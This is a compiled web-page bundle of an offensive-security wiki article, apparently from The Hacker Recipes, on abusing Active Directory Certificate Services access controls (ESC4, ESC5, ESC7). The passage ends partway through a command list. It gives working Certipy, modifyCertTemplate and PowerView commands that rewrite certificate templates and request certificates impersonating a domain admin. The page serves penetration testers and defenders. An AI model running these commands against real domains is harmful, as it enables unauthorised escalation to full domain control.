import{_ as k,c as o,a5 as h,G as t,w as a,B as n,o as p,j as i,a as s}from"./chunks/framework.B5CpDqM0.js";const f=JSON.parse('{"title":"Access controls","description":"","frontmatter":{"authors":"Croumi, ShutdownRepo, lap1nou, sckdev, BlWasp"},"headers":[],"relativePath":"ad/movement/adcs/access-controls.md","filePath":"ad/movement/adcs/access-controls.md","lastUpdated":1726092039000}'),d={name:"ad/movement/adcs/access-controls.md"};function c(g,e,F,E,y,C){const l=n("PluginTabsTab"),r=n("PluginTabs");return p(),o("div",null,[e[6]||(e[6]=h('<h1 id="access-controls" tabindex="-1">Access controls <a class="header-anchor" href="#access-controls" aria-label="Permalink to &quot;Access controls&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>In <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2" target="_blank" rel="noreferrer">their research papers</a>, <a href="https://twitter.com/harmj0y" target="_blank" rel="noreferrer">Will Schroeder</a> and <a href="https://twitter.com/tifkin_" target="_blank" rel="noreferrer">Lee Christensen</a> found multiple vectors of domain escalation based on access control misconfigurations (dubbed <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2#7c4b" target="_blank" rel="noreferrer">ESC4</a>, <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2#0a38" target="_blank" rel="noreferrer">ESC5</a> and <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2#fdbf" target="_blank" rel="noreferrer">ESC7</a>).</p><p>Active Directory Certificate Services add multiple objects to AD, including securable ones which principals can have permissions over. This includes:</p><ul><li>Certificate templates (ESC4): powerful rights over these objects can allow attackers to <em>&quot;push a misconfiguration to a template that is not otherwise vulnerable (e.g., by enabling the <code>mspki-certificate-name-flag</code> flag for a template that allows for domain authentication) this results in the same domain compromise scenario [...]&quot; (</em><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2" target="_blank" rel="noreferrer"><em>specterops.io</em></a><em>)</em> as the one based on misconfigured certificate templates where low-privs users can specify an arbitrary SAN (<code>subjectAltName</code>) and authenticate as anyone else.</li><li>The Certificate Authority (ESC7): <em>&quot;The two main rights here are the <code>ManageCA</code> right and the <code>ManageCertificates</code> right, which translate to the “CA administrator” and “Certificate Manager” (sometimes known as a CA officer) respectively. known as Officer rights)&quot; (</em><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2" target="_blank" rel="noreferrer"><em>specterops.io</em></a><em>)</em>.</li><li>Attack path 1: if an attacker gains control over a principal that has the <code>ManageCA</code> right over the CA, or local admin right, he can remotely flip the <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> bit to allow SAN specification in any template (c.f. <a href="./certificate-authority">CA misconfiguration</a>). This only works if the attacker is able to restart the <code>CertSvc</code> service on the CA server.</li><li>Attack path 2: alternatively (or if the attacker can&#39;t restart the <code>CertSrv</code>), if an attacker gains control over a principal that has the <code>ManageCA</code> right over the CA object, he can remotely gain the <code>ManageCertificates</code> right, approve pending certificate requests, subverting the &quot;CA certificate manager approval&quot; protection (referred to as PREVENT4 in <a href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf" target="_blank" rel="noreferrer">the research whitepaper</a>).</li><li>Several other objects (ESC5): abuse standard <a href="./../dacl/">AD access control abuse</a> over regulard AD objects.</li><li>The CA server’s AD computer object (i.e., compromise through <a href="./../kerberos/delegations/rbcd">RBCD abuse</a>, <a href="./../kerberos/shadow-credentials">Shadow Credentials</a>, <a href="./../kerberos/unpac-the-hash">UnPAC-the-hash</a>, ...).</li><li>The CA server’s RPC/DCOM server</li><li>Any descendant AD object or container in the container <code>CN=Public Key Services,CN=Services,CN=Configuration,DC=DOMAIN,DC=LOCAL</code> (e.g., the Certificate Templates container, Certification Authorities container, the <code>NTAuthCertificates</code> object, the <code>Enrollment Services</code> Container, etc.) If a low-privileged attacker can gain control over any of these, the attack can likely compromise the PKI system.</li><li>...</li></ul><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><div class="tip custom-block"><p></p><p>Maliciously configuring a CA or a certificate template can be insufficient. A controlled AD object (user or computer) must also have the ability to request a certificate for that template. &gt; The controlled AD object must have <code>Certificate-Enrollment</code> rights over the enrollment services (i.e. CA) and over the certificate template (<a href="https://www.riskinsight-wavestone.com/en/2021/06/microsoft-adcs-abusing-pki-in-active-directory-environment/#section-2-2-3" target="_blank" rel="noreferrer">source</a>).</p><p><a href="https://github.com/PowerShellMafia/PowerSploit/tree/dev" target="_blank" rel="noreferrer">PowerSploit</a>&#39;s <a href="https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainObjectAcl/" target="_blank" rel="noreferrer">Add-DomainObjectAcl</a> function (in <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noreferrer">PowerView</a>) can be used to add <code>Certificate-Enrollment</code> rights to a &quot;controlled AD object&quot; over a specific template. In order to achieve this, the attacker needs to have enough rights (i.e. <a href="./../dacl/grant-rights"><code>WriteDacl</code></a>) over the certificate template.</p><div class="language-powershell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">powershell</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">Add-DomainObjectAcl</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> -</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">TargetIdentity </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;target template&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> -</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">PrincipalIdentity </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;controlled object&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> -</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">RightsGUID </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;0e10c968-78fb-11d2-90d4-00c04f79dc55&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> -</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">TargetSearchBase </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;LDAP://CN=Configuration,DC=DOMAIN,DC=LOCAL&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> -</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Verbose</span></span></code></pre></div><p>The example above shows how to edit a certificate template&#39;s DACL (requires <a href="./../dacl/grant-rights"><code>WriteDacl</code></a> over the template, i.e. <a href="./access-controls#certificate-templates-esc4">ESC4</a>), but modifying a CA&#39;s DACL follows the same principle (requires <a href="./../dacl/grant-rights"><code>WriteDacl</code></a> over the CA, i.e. <a href="./access-controls#certificate-authority-esc7">ESC7</a>).</p></div><h3 id="certificate-templates-esc4" tabindex="-1">Certificate templates (ESC4) <a class="header-anchor" href="#certificate-templates-esc4" aria-label="Permalink to &quot;Certificate templates (ESC4)&quot;">​</a></h3><p>In order to obtain an abusable template, some attributes and parameters need to be properly setup</p><ol><li>Get Enrollment rights for the vulnerable template</li><li>Disable <code>PEND_ALL_REQUESTS</code> flag in <code>mspki-enrollment-flag</code> for disabling Manager Approval</li><li>Set <code>mspki-ra-signature</code> attribute to <code>0</code> to disable Authorized Signature requirement</li><li>Enable <code>ENROLLEE_SUPPLIES_SUBJECT</code> flag in <code>mspki-certificate-name-flag</code> to allow requesting users to specify another privileged account name as a SAN</li><li>Set <code>mspki-certificate-application-policy</code> to a certificate purpose for authentication <ol><li>Client Authentication (OID: <code>1.3.6.1.5.5.7.3.2</code>)</li><li>Smart Card Logon (OID: <code>1.3.6.1.4.1.311.20.2.2</code>)</li><li>PKINIT Client Authentication (OID: <code>1.3.6.1.5.2.3.4</code>)</li><li>Any Purpose (OID: <code>2.5.29.37.0</code>)</li><li>No EKU</li></ol></li><li>Request a certificate (with a high-privileged user&#39;s name set as SAN) for authentication and perform <a href="./../kerberos/ptt">Pass the Ticket</a>.</li></ol>',10)),t(r,null,{default:a(()=>[t(l,{label:"UNIX-like"},{default:a(()=>e[0]||(e[0]=[i("p",null,[s("From UNIX-like systems, "),i("a",{href:"https://github.com/ly4k/Certipy",target:"_blank",rel:"noreferrer"},"Certipy"),s(" (Python) can be used to enumerate these sensitive access control entries ("),i("a",{href:"./#attack-paths"},"how to enumerate"),s("), and to overwrite the template in order to add the SAN attribute and make it vulnerable to ESC1. It also had the capacity to save the old configuration in order to restore it after the attack.")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 1. Save the old configuration, edit the template and make it vulnerable")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," template"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"@"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_IP"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -template"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," templateName"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -save-old")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Warning: running the coommand twice will override the backup file, make sure to keep a seconde backup of the old configuration somwhere.")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 2. Request a template certificate with a custom SAN")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," req"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"@"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_IP"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -target"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$ADCS_HOST"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -ca"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'ca_name'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -template"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'vulnerable template'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -upn"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'domain admin'")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 3. After the attack, restore the original configuration")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," template"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"@"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_IP"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -template"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," templateName"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -configuration"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'templateName.json'")])])])],-1),i("p",null,[s("If a more precise template modification is needed, "),i("a",{href:"https://github.com/fortalice/modifyCertTemplate",target:"_blank",rel:"noreferrer"},"modifyCertTemplate"),s(" (Python) can be used to modify each attributes of the template.")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 1. Disable Manager Approval Requirement")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"modifyCertTemplate.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -template"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," templateName"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -value"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," 2"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -property"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," mspki-enrollment-flag"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},":"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"')]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 2. Disable Authorized Signature Requirement")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"modifyCertTemplate.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -template"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," templateName"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -value"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," 0"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -property"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," mspki-ra-signature"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},":"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"')]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 3. Enable SAN Specification")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"modifyCertTemplate.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -template"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," templateName"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -add"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," enrollee_supplies_subject"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -property"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "msPKI-Certificate-Name-Flag"'),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},":"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"')]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 4. Edit Certificate Application Policy Extension")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"modifyCertTemplate.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -template"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," templateName"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -value"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},` "'1.3.6.1.5.5.7.3.2', '1.3.6.1.5.2.3.4'"`),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -property"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "pKIExtendedKeyUsage"'),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},":"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"')])])])],-1),i("div",{class:"tip custom-block"},[i("p"),i("p",null,[s("By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The "),i("code",null,"-scheme"),s(" flag can be used to set whether to use LDAP or LDAPS.")])],-1)])),_:1}),t(l,{label:"Windows"},{default:a(()=>e[1]||(e[1]=[i("p",null,[s("From Windows systems, the "),i("a",{href:"https://github.com/GhostPack/Certify",target:"_blank",rel:"noreferrer"},"Certify"),s(" (C#) tool can be used to enumerate these sensitive access control entries. At the time of writing (October 21st, 2021) "),i("a",{href:"./../../recon/bloodhound/index"},"BloodHound"),s(" doesn't support (yet) enumeration of these access controls. "),i("a",{href:"https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1",target:"_blank",rel:"noreferrer"},"PowerView"),s(" can be used to modify the template.")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 1. Enumerate sensitive access control entries")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Certify.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," find")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 2. Disable Manager Approval Requirement")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Set-DomainObject"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"SearchBase "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Identity tempalteName "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-XOR"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," @"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"{"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'mspki-enrollment-flag'"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"2"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"} "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Verbose")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 3. Disable Authorized Signature Requirement")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Set-DomainObject"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"SearchBase "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Identity templateName "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Set "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"@"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"{"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'mspki-ra-signature'"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"0"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"} "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Verbose")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 4. Enable SAN Specification")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Set-DomainObject"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"SearchBase "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Identity templateName "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-XOR"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," @"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"{"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'mspki-certificate-name-flag'"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"1"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"} "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Verbose")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 5. Edit Certificate Application Policy Extension")]),s(`
